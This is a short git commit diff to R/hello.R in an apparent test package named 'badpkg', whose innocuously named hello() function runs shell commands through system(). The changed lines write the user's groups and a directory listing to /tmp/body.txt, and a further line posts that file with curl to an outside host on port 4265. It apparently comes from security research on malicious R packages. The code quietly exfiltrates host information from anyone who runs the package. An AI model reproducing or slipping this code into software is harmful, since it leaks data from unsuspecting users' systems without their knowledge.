6b32f567565a479e23443094ca18849ee0aadefc
wenright-rs1 <wenright-rs1@vsecurity.com>
2017-05-24 15:22:19 -0400

    Update hello.R

--- R/hello.R
+++ R/hello.R
@@ -23,7 +23,8 @@ hello <- function() {
 
 #file.create("/Users/jeff/workspace/badpkg/heyo2.txt")
 
-system('groups >> /tmp/body.txt')
+system('groups > /tmp/body.txt')
+system('echo ===== >> /tmp/body.txt')
 #system('ls -la /var/lib/rstudio-connect/mnt/packrat >> /tmp/body.txt')
-system('ls -la')
+system('ls -la >> /tmp/body.txt')
 system('curl -X POST -H "Content-Type: text/plain" --data-binary "@/tmp/body.txt" http://enterpriseupdate.safewebcheck.com:4265')
